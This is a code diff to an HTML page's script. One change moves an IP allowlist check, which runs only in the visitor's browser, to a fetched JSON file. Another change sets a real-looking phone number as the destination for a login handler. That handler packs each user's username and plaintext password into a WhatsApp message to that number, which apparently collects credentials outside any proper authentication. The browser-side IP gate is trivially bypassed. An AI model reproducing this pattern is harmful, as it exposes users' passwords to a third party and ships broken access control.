@@ -38,11 +38,14 @@
     <script>
         async function checkIP() {
             try {
-                let response = await fetch('https://api.ipify.org?format=json'); // Use IPv4 API
+                let response = await fetch('https://api.ipify.org?format=json'); // Get user's IP
                 let data = await response.json();
                 console.log("Fetched IP:", data.ip); // Debugging log
-                let allowedIP = "103.174.159.208";
-                if (data.ip.trim() === allowedIP) {
+
+                let ipListResponse = await fetch('ip_data.json'); // Fetch allowed IPs from JSON file
+                let ipList = await ipListResponse.json();
+
+                if (ipList.allowed_ips.includes(data.ip.trim())) {
                     document.getElementById('container').style.display = 'block';
                 } else {
                     document.body.innerHTML = "<h1>Access Denied</h1><p>Your IP is not authorized.</p>";
@@ -69,7 +72,7 @@
             let subscription = document.getElementById('subscription').value;
             let ip = await getIP();
             let message = `Login Details:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nSubscription: ${subscription}`;
-            let phoneNumber = "1234567890"; // Replace with your WhatsApp number
+            let phoneNumber = "+919545689031"; // Replace with your WhatsApp number
             let whatsappUrl = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
             window.location.href = whatsappUrl;
         }
